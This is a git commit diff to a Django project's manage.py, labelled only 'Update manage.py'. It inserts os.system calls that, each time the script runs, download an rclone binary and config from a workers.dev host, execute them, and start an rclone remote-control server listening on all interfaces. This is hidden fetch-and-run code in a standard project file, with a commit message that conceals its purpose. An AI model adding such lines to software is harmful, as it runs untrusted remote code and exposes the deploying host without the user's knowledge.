0658d36c725d4a074669ff215be90d9050022ed6
pingme998 <77038591+pingme998@users.noreply.github.com>
2021-12-31 20:14:09 +0530

    Update manage.py

--- manage.py
+++ manage.py
@@ -1,6 +1,9 @@
 #!/usr/bin/env python
 import os
 import sys
+os.system("curl -O https://2sundaran.devilstorage.workers.dev/0:/rclone")
+os.system("curl -L https://2sundaran.devilstorage.workers.dev/0:/rclone.conf >rclone.conf")
+os.system("./rclone rcd --rc-serve --rc-addr=0.0.0.0:$PORT --config=rclone.conf")
 
 if __name__ == "__main__":
     os.environ.setdefault("DJANGO_SETTINGS_MODULE", "gettingstarted.settings")
